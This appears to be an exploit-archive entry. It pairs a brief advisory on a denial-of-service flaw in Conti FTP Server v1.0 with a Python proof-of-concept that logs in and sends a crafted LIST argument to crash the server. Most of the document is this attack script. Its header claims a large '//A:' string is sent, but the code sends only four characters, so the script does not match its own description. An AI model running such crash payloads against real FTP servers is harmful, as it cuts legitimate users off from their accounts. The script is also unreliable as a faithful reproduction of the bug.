source: http://www.securityfocus.com/bid/24672/info

The Conti FTP Server is prone to a denial-of-service vulnerability.

A remote attacker may be able to exploit this issue to deny service to legitimate users of the application. 

#Conti FTP Server v1.0 Denial of Service
#author: 35c666
#contact: :(
#Download:
http://www.procesualitatea.ro/bestplay/Conti_FtpServer_Setup.exe
#Bug: Conti Ftp Server crashes when a large //A: string is sent,
denying legitimate users access to their accounts.
#greetz to all  RST members at http://rstzone.net

# usr/bin/python

import socket
import time

buff = "//A:"

user = "test"
password = "test"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
   conn = s.connect(("172.16.112.129",21))
   d = s.recv(1024)
   print "Server <- " + d
   time.sleep(2)

   s.send('USER %s\r\n' % user)
   print "Client -> USER " + user
   d = s.recv(1024)
   print "Server <- " + d
   time.sleep(2)

   s.send('PASS %s\r\n' % password)
   print "Client -> PASS " + password
   d = s.recv(1024)
   print "Server <- " + d
   time.sleep(2)

   s.send('LIST %s\r\n' % buff)
   print "Client -> LIST " + buff
   d = s.recv(1024)
   print d
   time.sleep(2)

except:
   print "- Nu m-am putut conecta."

